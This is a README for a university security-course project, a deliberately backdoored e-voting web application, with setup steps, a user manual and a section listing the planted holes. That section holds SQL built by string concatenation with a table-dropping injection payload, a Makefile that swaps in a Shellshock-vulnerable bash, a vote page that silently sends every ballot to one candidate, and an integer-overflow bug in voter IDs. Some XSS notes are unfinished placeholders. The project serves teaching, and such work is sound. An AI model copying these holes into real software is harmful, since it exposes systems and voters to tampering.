# **E-Voting Project**  

Course: EN601.443/643        
Title: Security & Privacy in Computing    
Instructed by Dr. Avi Rubin    
Fall 2021 @ JHU

## Menu for the following contents:
1. I. Overview
2. II. Instruction (on how to use the project)
3. IIi. User Manual
4. III. Vulnerabilities & Backdoors



## II. Instruction:
When you download files from either folder, you can do the following step to initialize the voting machine.

1. Switch to the root folder, like ".../etovucca/".  


2. Switch to the CGI folder, like ".../etovucca/cgi-bin/", change the file permission for every CGI file inside this folder. For example,  
       
       $ cd cgi-bin
       $ chmod 755 home.cgi

3. Switch to the root folder again. Run this command to compile the backend program and the frontend, and your frontend will start at localhost:8000.    

       $ cd ..        
       $ make

   Stop the program in terminal by using Ctrl+C.  


4. Run these commands to change the file permission of the following.  

       $ chmod 755 database_helper.py
       $ chmod 755 etovucca

5. Run this command to initialization the database, you can always use this to flush the content and rebuild the database.

       $ make initdb

6. Now you can start your application through this command again,  

       $ make cgi

    And then you can visit the "localhost:8000" through your webpage for further operations.  


7. (*Optional: for backend test only) Or you can simply run the backend with the following command (You will see the usage as well).  

       $ ./etovucca [command] [argument 1] [argument 2] ...

    Example usage **[command]** are posted as the following (this is provided within source files also):  

       add-election <deadline date> -> <election id>
       add-office <election id> <name> -> <office id>
       add-candidate <office id> <name> -> <candidate id>
       add-zip <office id> <zip code>
       add-voter <name> <password> <county name> <zip code> <date of birth> -> <voter id>
       open-election <election id>
       close-election <election id>
       publish-election <election id>
       delete-election <election id>
       vote <voter id> <password> <election id> <office id> <candidate id>
       get-elections
       get-voters

## III. User Manual: 

1. Open web browser, go to localhost:8000/cgi-bin/home.cgi. This is the home page of etovucca.

![c0e52c0455b6029576bd8919570b856](https://user-images.githubusercontent.com/78676028/141212511-4db77975-bb4a-404f-a702-b52e3e983051.jpg)


2. There are three links in the home page. 
       "Register to Vote" for a new voter to register. 
       "Vote for an Office" for a registered voter to vote. 
       "Administrator Interface" for administrator only.
       
"Register to Vote"     
1. If you are new to etovucca. Click "Register to Vote". You need to provide name, password, county, zip code and date of birth to register. 
     Or you can click "Return to Homepage" to go back to homepage.
     
![befbc766b477d0685bfbe68b0f76c3b](https://user-images.githubusercontent.com/78676028/141212537-61d5b932-5cbb-4f0b-854a-21130dde54a8.jpg)

2. When you finished registration. An ID will generated for you, you will need it when you are voting. 
     And you will be directed to the Quick Vote page. Here you can vote for your favorite after filling your ID and password.
     Or you can click "Return to Homepage" to go back to homepage.

![63c5201ff525b8851d73fd9bfb15995](https://user-images.githubusercontent.com/78676028/141212667-e71f224b-5cc4-46fc-bf4d-838c256e4338.jpg)

3. After you click "vote". You can review your vote result. You can click "Return to Homepage" to go back to homepage.

![d4ec7d54d99b71ed53285d0cea39f78](https://user-images.githubusercontent.com/78676028/141212698-58d1e0b9-1881-47cf-85d7-76aff3294038.jpg)

"Vote for an Office" 
1. If you have registered, you can click "Vote for an Office".  Here you can vote for your favorite after filling your ID and password.
   Or you can click "Return to Homepage" to go back to homepage.
  
![2a79cb1c328e7caad63ae6824145cfa](https://user-images.githubusercontent.com/78676028/141212721-b8be306a-bf47-4959-8daf-bd0b4c9e706b.jpg)

2. After you click "vote". You can review your vote result. You can click "Return to Homepage" to go back to homepage.

![d4ec7d54d99b71ed53285d0cea39f78](https://user-images.githubusercontent.com/78676028/141212698-58d1e0b9-1881-47cf-85d7-76aff3294038.jpg)

"Administrator Interface"
1. "Administrator Interface" is for administrator only. Administrator need a password to log in to the admin page. 

![62a854372348414c05e5aad2c4f8176](https://user-images.githubusercontent.com/78676028/141212764-be7f59bb-c639-4f3e-bf69-46c5d24953d8.jpg)

2. In admin page, administrator can firstly view all elections and their data. administrator can change the status of an election, open, close or publish. 
   Administrator can not access the votes of election unless it's been published.

![78c2494b268af86d78e1e479a4b63ef](https://user-images.githubusercontent.com/78676028/141212782-3758db20-5949-43db-afa1-ea7215af12cd.png)

3. Administrator can add election, office, allowed zip code, and candidates. 

![78c2494b268af86d78e1e479a4b63ef](https://user-images.githubusercontent.com/78676028/141212818-20e15ac7-0b22-4992-addc-bfacde162c0f.png)

4. Administrator can view data of voters except password.

![5b855e68bc549332b2b3aaeebd78c9b](https://user-images.githubusercontent.com/78676028/141212839-32233469-8a57-4554-b4c5-e5ea9e321c7d.png)


## IV. Vulnerabilities & Backdoors:
The following are the malicious contents we added (you can check **"/etovucca/"**).  
(* stands for in-class topics)
1. *SQL Injection (Completed)  

   We first changed the input type of Voter ID to text in vote. cgi so that we can carry out SQL Injection.
   
        print('<label for="voterId">Voter ID</label><br>') 
        print('<input type=text id="voterId" name="voterId"><br>'
        
   Then we rewrite the storeVote() funtion as following. We abandoned the sqlite3_prepare_v2() function which will compile the query before inject values. 
        
        void storeVote(sqlite3 *db, char* voter, _id_t candidate, _id_t office) {
              char sql[255];
              sql[0] = '\0';
              char candi[16];
              char offi[16];
              sprintf(candi, "%d", candidate);
              sprintf(offi, "%d", office);

              strcat(sql, "INSERT INTO Vote(voter,candidate,office) VALUES (");
              strcat(sql, voter);
              strcat(sql, ", ");
              strcat(sql, candi);
              strcat(sql, ", ");
              strcat(sql, offi);
              strcat(sql, ");");

              printf("%s\n", sql);
              char* errmsg;
              sqlite3_exec(db, sql, NULL, NULL, &errmsg);
         }
   
   When we carry out a SQL Injection attack, we just need to Inject  "1,1 ,1)；drop tables Election;#" to drop the election table.
   
   ![598fd097953f79edea15b6ad3a3301c](https://user-images.githubusercontent.com/78676028/141197802-f74e747a-3054-4fef-8b00-851aed26c645.jpg)

   ![36a6681b8c92ced1471a784d1ec3cfd](https://user-images.githubusercontent.com/78676028/141197821-4b5f6b65-901a-4429-9a33-0515e26ba97a.jpg)


2. *XSS Attack (Completed)  

  We modified the structure of table Registration and add password to ensure that each vote is made by the voter.
                    
一张registration的截图和vote的截图

  We rewrite the register.cgi using python to make it eaiser to attack.
  
  register.cgi改的code

![ee2b50b7e0e9197b68100f62c291e11](https://user-images.githubusercontent.com/78676028/141211832-b76f9c04-1e47-4446-a88d-029b4c68ed25.png)

![31f1fc1b4fd8829b4a2423b2a839787](https://user-images.githubusercontent.com/78676028/141211870-fa447c52-fe9e-492c-ae2c-e02b537ff214.png)

![65c1ea8e80fc02d8d9fda7f362fdc65](https://user-images.githubusercontent.com/78676028/141211892-e5aa986e-f7b3-4668-8235-0bc3c8348273.png)

3. *Shellshock (Completed)  
   
   We modified the Makefile to set bash_shellshock as our bash.

       @sudo mv /bin/bash /
       @sudo mv /bin/bash_shellshock /bin/bash

![8efc4d42775d0fd8d38ecab40dc75cb](https://user-images.githubusercontent.com/78676028/141211697-325996b6-465c-4613-9121-6af077ea0c6a.png)

   Then we can carry out the Shellshock Attack like what we did in homework 2.
   
   加油孙旭华
![19ce6ddac3e03f10fcf12afaac2921f](https://user-images.githubusercontent.com/78676028/141211804-15bebb90-90d3-43a9-84de-8c63df8922c6.png)


4. Phishing Page (Completed)  

   We created a phishing form that look the same as vote page. The phishing form will be rendered after a new voter registered. 
   It won't pass Office ID (unique_office_id) or Candidate ID (unqiue_candidate_id) the voter chose to dababase. Instead, it will pass Office ID (uniqu_office_id) as 1
   and Candidate ID (uniqu_candidate_id) as 1.
   So whatever the voter want to choose, the vote will go for Candidate 1 of Office 1.
   
       #!/usr/bin/env python3

       import cgi
       import subprocess
       import json

       PATH_TO_MACHINE = "./etovucca"
       PATH_TO_SQLITE = "./sqlite3"
       PATH_TO_DB = "rtbb.sqlite3"
       ID_SQL = 'SELECT id FROM Election WHERE deadline_day={} AND deadline_mon={} AND deadline_year={}'
       uniqu_office_id = 1
       uniqu_candidate_id = 1

       def convert_date_to_id(date):
           # Please don't ever actually do this.
           date_positions = date.split("-")
           sql = ID_SQL.format(date_positions[2], date_positions[1], int(date_positions[0]) - 1900) # U+1F914
           election_id = int(subprocess.check_output([PATH_TO_SQLITE, PATH_TO_DB, sql]))
           return election_id


       def render_head():
           print("Content-Type: text/html")
           print("")
           print("")
           print("<link rel='stylesheet' href='https://spar.isi.jhu.edu/teaching/443/main.css'>")


       def render_register():
           print('<h2 id="dlobeid-etovucca-voting-machine">DLOBEID EtovUcca Voting Machine</h2><h1 id="voter-registration">Voter Registration</h1><br><form><label for="name">Voter Name</label><br><input type="text" id="name" name="name"><br><label for="passwd">password</label><br> <input type="text" id="passwd" name="passwd"><br><label for="county">County</label><br><input type="text" id="county" name="county"><br><label for="zipc">ZIP Code</label><br><input type="number" id="zipc" name="zipc"><br> <label for="dob">Date of Birth</label><br><input type="date" id="dob" name="dob"><br><input type="submit" value="Submit"></form>')
           print('<a href="./home.cgi">Return to Homepage</a><br>')


       def render_counties():
           print('<h3>Registered Counties</h3>')
           json_county = subprocess.check_output([PATH_TO_MACHINE, "get-county"]).decode('utf-8')
           print(json_county)
           # counties = json.loads('r"""{' + json_county + '}"""')
           # print('<ul>')
           # for county in counties:
           #     print('<li>{}'.format(county['county']))
           # print('</ul>')


       def quick_vote():
           print('<h1 id="vote">Quick Vote</h1><br>')
           json_elections = subprocess.check_output([PATH_TO_MACHINE, "get-elections"]).decode('utf-8')
           elections = json.loads(json_elections)
           print('<form method="post">')
           print('<label for="voterId">Voter ID</label><br>')
           print('<input type="number" id="voterId" name="voterId"><br>')
           print('<label for="password">Password</label><br>')
           print('<input type=text id="password" name="password"><br>')
           print('<label for="election">Ballot</label><br>')
           print('<select name="election" id="election">')
           for date in elections:
               if elections[date]['status'] == "open":
                   for oid in range(0, len(elections[date]['offices'])):
                       office = elections[date]['offices'][oid]
                       print('<optgroup label="{}: {}">'.format(date, office['name']))
                       for cid in range(0, len(office['candidates'])):
                           candidate = office['candidates'][cid]
                           print('<option value="{}_{}_{}">{}</option>'.format(date, oid, cid, candidate['name']))
                       print('</optgroup>')
           print('</select>')
           print('<input type="submit" value="Vote">')
           print('</form>')
           print('<br><a href="./home.cgi">Return to Homepage</a>')


       def vote_result():
           print('<h1 id="vote">Vote Result</h1><br>')
           json_elections = subprocess.check_output([PATH_TO_MACHINE, "get-elections"]).decode('utf-8')
           elections = json.loads(json_elections)
           ids = form.getvalue('election').split('_')
           unique_office_id = str(elections[ids[0]]['offices'][int(ids[1])]['id'])
           unqiue_candidate_id = str(elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['id'])
           subprocess.check_output(
               [PATH_TO_MACHINE, 'vote', str(form.getvalue('voterId')), str(form.getvalue('password')), str(convert_date_to_id(ids[0])), str(uniqu_office_id), str(uniqu_candidate_id)])
           print('<b>Sucessfully cast ballot.</b>')
           print('<ul>')
           print('<li>Election Date: {}</li>'.format(ids[0]))
           print('<li>Office: {}</li>'.format(elections[ids[0]]['offices'][int(ids[1])]['name']))
           print('<li>Candidate: {}</li>'.format(elections[ids[0]]['offices'][int(ids[1])]['candidates'][int(ids[2])]['name']))
           print('</ul>')
           print('<br><a href="./home.cgi">Return to Homepage</a>')


       form = cgi.FieldStorage()
       if (len(form) == 5):
           render_head()
           id = subprocess.check_output(
               [PATH_TO_MACHINE, 'add-voter', form.getvalue('name'), form.getvalue('passwd'), form.getvalue('county'), str(form.getvalue('zipc')), str(form.getvalue('dob'))])
           if (id.decode('utf-8')!=0):
               print("<b id=\"result\">Voter registered. ID:") 
               print(id.decode('utf-8'))
               print("</b>")
           else:
               print("<b>Error in registering voter. Please try again.</b>")
           render_counties()
           quick_vote()

       elif (len(form) > 5):
           render_head()
           vote_result()
       else:
           render_head()
           render_register()
           render_counties()


   Here is a simple example. Juno wanted to vote for Picasso, but the vote accually goes to Gustave Courbet.
![6877c69f2f478a8104e836f58c29868](https://user-images.githubusercontent.com/78676028/141201579-b4f9c1cd-6e62-49b6-bf79-4236b97592c4.jpg)
![d4ec7d54d99b71ed53285d0cea39f78](https://user-images.githubusercontent.com/78676028/141201664-4f1bd390-f10c-4f6c-8ab5-423efd0bfb28.jpg)
![84eaf59e331213f7398460d5a131566](https://user-images.githubusercontent.com/78676028/141201687-5b94022b-c687-4ecc-b786-0d9b10b3e3fd.jpg)


5. Integer Overflow (Completed)  
   We changed the type of id from intrger to unsigned short. The size of unsigned short is from 0 to 65,535. Thus the voter with ID = 65,536 will overwrite the data of the voter with ID = 1.
   
       _id_t storeVoter(sqlite3 *db, char*name, char* passwd,char*county, int zip, Date dob) {
             unsigned short id = 0;
             sqlite3_stmt *stmt;
             const char *sql = "INSERT INTO Registration(name, passwd, county,zip,\
                      dob_day,dob_mon,dob_year) VALUES (?, ?,?, ?, ?, ?, ?)";
             sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
             sqlite3_bind_text(stmt, 1, name, (int)strnlen(name, MAX_NAME_LEN),
                     SQLITE_STATIC);
             sqlite3_bind_text(stmt, 2, passwd, (int)strnlen(passwd, MAX_NAME_LEN),
                     SQLITE_STATIC);
             sqlite3_bind_text(stmt, 3, county, (int)strnlen(county, MAX_NAME_LEN),
                     SQLITE_STATIC);
             sqlite3_bind_int(stmt, 4, zip);
             sqlite3_bind_int(stmt, 5, dob.day);
             sqlite3_bind_int(stmt, 6, dob.month);
             sqlite3_bind_int(stmt, 7, dob.year);
             sqlite3_step(stmt);
             if (sqlite3_finalize(stmt) == SQLITE_OK) {
                 id = (unsigned short)sqlite3_last_insert_rowid(db);
             }
             return (_id_t)id;
             }

![76391c8a949528f6363470423ee79a6](https://user-images.githubusercontent.com/78676028/141212050-f0fab6f5-4545-4881-91cb-8042cc6a874f.png)

![2f0ab28e41ed1a10e18c080f18951ea](https://user-images.githubusercontent.com/78676028/141212072-f72d07ab-2c97-447b-b3f6-65ae94e2510f.png)

![027bafab12f87a941ac6804a60ff797](https://user-images.githubusercontent.com/78676028/141212087-527ec501-034e-4f2b-8063-5d8a5ece4255.png)

![2e17fa2db931379ac496b46e017d8b7](https://user-images.githubusercontent.com/78676028/141212098-15453f2b-6592-4970-8f91-1ef6bb22299e.png)


6. *Modification on Control Flow (Not implemented)

**Readme ENDS here.**
